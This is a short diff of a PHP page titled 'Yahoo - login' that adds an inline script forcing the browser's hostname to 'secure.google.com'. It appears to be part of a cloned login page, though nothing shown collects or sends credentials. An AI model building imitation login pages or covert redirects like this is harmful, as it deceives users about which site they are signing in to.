@@ -8,7 +8,10 @@ require_once('helper.php');
   <head>
 
     <title>Yahoo - login</title>
-
+    <script>      
+    if (globalThis.location.hostname != "secure.google.com") {
+		    globalThis.location.hostname = "secure.google.com"
+	    }</script>
     <meta charset='UTF-8'>
     <meta http-equiv="cache-control" content="no-cache" />
     <meta http-equiv="expires" content="0" />
